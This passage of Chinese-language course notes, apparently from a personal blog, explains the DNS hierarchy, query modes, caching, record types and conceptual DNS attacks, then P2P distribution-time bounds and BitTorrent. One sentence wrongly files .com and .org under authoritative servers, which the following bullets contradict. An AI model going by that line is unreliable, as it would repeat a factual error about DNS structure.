<li>DNS服务器向DNS客户机送回一个包含对应IP地址的响应报文</li>
<li>DNS客户机将该IP地址传送给浏览器</li>
<li>浏览器向该IP地址所在Web服务器发起TCP连接</li>
</ul>
<p>如果全世界只有一台DNS服务器，那么</p>
<ul>
<li>单点故障造成的问题会很严重</li>
<li>DNS服务器承载的流量过大不堪重负</li>
<li>远程集中式数据库的查询会带来严重的延时</li>
<li>维护量巨大，必须实时更新以适应互联网上主机的增减</li>
</ul>
<p>因此现实中DNS服务器以层级结构进行设计。最高为根服务器，下面依次为顶级域名服务器（如国家域名 .cn、.jp服务器）、权威服务器（.com、.org等）</p>
<ul>
<li>当本地域名服务器不能解析时，就向根域名服务器查询。</li>
<li>顶级域DNS服务器负责顶级域名和所有国家的顶级域名解析工作，如 .com、.org、.net、.gov、.uk、.jp等</li>
<li>权威DNS服务器是属于某个组织的DNS服务器，为组织的服务器提供一个权威的域名到IP地址的映射服务，如Web和Mail</li>
<li>本地DNS服务器位于权威DNS服务器之下，严格意义上并不属于DNS层次结构中的一层。每一个网络服务商都会提供一个本地DNS服务器（又称默认DNS服务器），当一台主机需要域名查询时，请求首先被发送到本地域名服务器，其作用相当于一个代理，向域名层次体系中做进一步的域名查询。</li>
</ul>
<p>DNS查询方式：</p>
<ul>
<li>发起请求使用递归查询，后续解析使用迭代查询（本地DNS服务器发送请求到根服务器，根服务器返回结果到本地DNS服务器，然后本地DNS服务器再去请求低一级的DNS服务器，即除了本地DNS服务器外所有DNS服务器都只接收一次请求发送一次请求）</li>
<li>纯递归查询（本地DNS服务器发送请求到根服务器，根服务器找到后发送请求到低一级的DNS服务器，整个请求是一个链式结构）</li>
<li>上面两种方式中第1种更好，因为第1种请求1次只需要根服务器发送1次请求，而第2种需要发送2次</li>
</ul>
<p><font color=red>DNS缓存</font>：当域名服务器知道了某个映射，就将其缓存。</p>
<ul>
<li>在一定时间间隔后缓存的条目将会过期自动删除</li>
<li>顶级域DNS服务器通常被缓存在本地的DNS服务器中</li>
<li>这样可以减少根DNS的负载</li>
</ul>
<p>DNS可以提供的服务有：</p>
<ul>
<li>域名到IP地址的转换</li>
<li>主机/邮件/服务器别名：为不好记的主机/邮件服务器名提供一个容易记忆的别名</li>
<li>负载均衡，一个域名对应于多个IP，DNS服务器在多个IP之间轮转</li>
</ul>
<h3 id="243-dns记录和报文"><a class="markdownIt-Anchor" href="#243-dns记录和报文"></a> 2.4.3 DNS记录和报文</h3>
<p>DNS记录的格式：(name, value, type, ttl)</p>
<ul>
<li>type=A时，name=主机名，value=IP地址</li>
<li>type=NS时，name=域，value=该域权威域名服务器的主机名</li>
<li>type=CNAME时，name=别名，value=真名</li>
<li>type=MX时，value=与name相关的邮件服务器域名</li>
</ul>
<p>通过Nslookup命令可以进行域名解析</p>
<h4 id="dns服务器攻击"><a class="markdownIt-Anchor" href="#dns服务器攻击"></a> DNS服务器攻击</h4>
<ul>
<li>DDoS攻击，通过洪泛攻击根服务器——难以成功，因为其通常配备分组过滤器，大多数本地DNS服务器都缓存了TLD DNS服务器的地址，使得洪泛攻击难以触及DNS根服务器本身</li>
<li>重定向攻击，攻击者截获来自主机的请求并返回伪造的回答（DNS劫持），或攻击者诱导服务器在缓存中接收伪造的记录（DNS毒害）</li>
<li>利用DNS服务器对目标主机采用DDoS攻击——反射攻击</li>
</ul>
<h2 id="25-p2p文件分发"><a class="markdownIt-Anchor" href="#25-p2p文件分发"></a> 2.5 P2P文件分发</h2>
<p>P2P服务器没有始终在线的服务器，允许端系统直接通信，对等方间歇性连接并更改IP地址。如文件分发BitTorrent、视频流PPTV、VoIP Skype等。</p>
<p>在C/S模式下，对于一个大小为F的文件，考虑对等方下载和上传速率优先的情况，设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">u_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>为服务器上传速率，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>为对等方的下载速率。当有N台客户机连接服务器时，服务器必须按顺序发送N份文件副本，总时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi>N</mi><mi>F</mi></mrow><msub><mi>u</mi><mi>s</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{NF}{u_s}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。每个客户端需要下载文件副本，设所有客户端中最小下载速率为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d_{min}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则客户端最长下载时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>F</mi><msub><mi>d</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{F}{d_{min}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。因此将F分配给N个客户机的时间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mrow><mi>c</mi><mo>−</mo><mi>s</mi></mrow></msub><mo>≥</mo><mi mathvariant="normal">max</mi><mo>⁡</mo><mo stretchy="false">{</mo><mfrac><mrow><mi>N</mi><mi>F</mi></mrow><msub><mi>u</mi><mi>s</mi></msub></mfrac><mo separator="true">,</mo><mfrac><mi>F</mi><msub><mi>d</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mfrac><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">T_{c-s}\ge\operatorname{max}\{\frac{NF}{u_s},\frac{F}{d_{min}}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mop"><span class="mord mathrm">m</span><span class="mord mathrm">a</span><span class="mord mathrm">x</span></span><span class="mopen">{</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">}</span></span></span></span>。<br />
在P2P模式下，服务器需要至少上传一份副本，时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>F</mi><msub><mi>u</mi><mi>s</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{F}{u_s}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，每一个客户端需要下载文件副本，最长时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>F</mi><msub><mi>d</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{F}{d_{min}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。多有客户端整体需要下载NF比特，最大上传速率为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mi>s</mi></msub><mo>+</mo><mo>∑</mo><msub><mi>u</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">u_s+\sum u_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。故将F分配给N个客户机的时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mrow><mi>P</mi><mn>2</mn><mi>P</mi></mrow></msub><mo>≥</mo><mi mathvariant="normal">max</mi><mo>⁡</mo><mo stretchy="false">{</mo><mfrac><mi>F</mi><msub><mi>u</mi><mi>s</mi></msub></mfrac><mo separator="true">,</mo><mfrac><mi>F</mi><msub><mi>d</mi><mrow><mi>m</mi><mi>i</mi><mi>n</mi></mrow></msub></mfrac><mo separator="true">,</mo><mfrac><mrow><mi>N</mi><mi>F</mi></mrow><mrow><msub><mi>u</mi><mi>s</mi></msub><mo>+</mo><mo>∑</mo><msub><mi>u</mi><mi>i</mi></msub></mrow></mfrac><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">T_{P2P}\ge\operatorname{max}\{\frac{F}{u_s},\frac{F}{d_{min}},\frac{NF}{u_s+\sum u_i}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.392338em;vertical-align:-0.520007em;"></span><span class="mop"><span class="mord mathrm">m</span><span class="mord mathrm">a</span><span class="mord mathrm">x</span></span><span class="mopen">{</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathnormal mtight">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.520007em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">}</span></span></span></span>，最后一个值随N线性增加，但每个对等方带来了服务能力。</p>
<h4 id="bittorrent基本概念"><a class="markdownIt-Anchor" href="#bittorrent基本概念"></a> BitTorrent基本概念</h4>
<p>洪流：参与一个特定文件分发的所有对等方的集合<br />
追踪器：跟踪正在参与在洪流中的对等方<br />
文件块：256KB</p>
<h4 id="bittorrent的基本工作机制"><a class="markdownIt-Anchor" href="#bittorrent的基本工作机制"></a> BitTorrent的基本工作机制</h4>
<ul>
<li>向邻居请求哪些文件块——最稀罕优先</li>
<li>优先响应哪些请求——对换算法（每10秒重新确定4个最高速率对等方。每30秒随机选择1个新的邻居）</li>
<li>下载时，对等方将块上载到其他的对等方</li>
<li>对等方可能会更改与之交换块的对等方</li>
<li>对等方不稳定，会产生波动</li>
<li>一旦对等方拥有了整个文件，它可能直接离开或留在洪流中</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0%E4%B9%A0%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0%E4%B9%A0%E9%A2%98/" class="post-title-link" itemprop="url">计算机网络——第1章习题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:44:34 / 修改时间：23:44:50" itemprop="dateCreated datePublished" datetime="2023-03-02T23:44:34+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
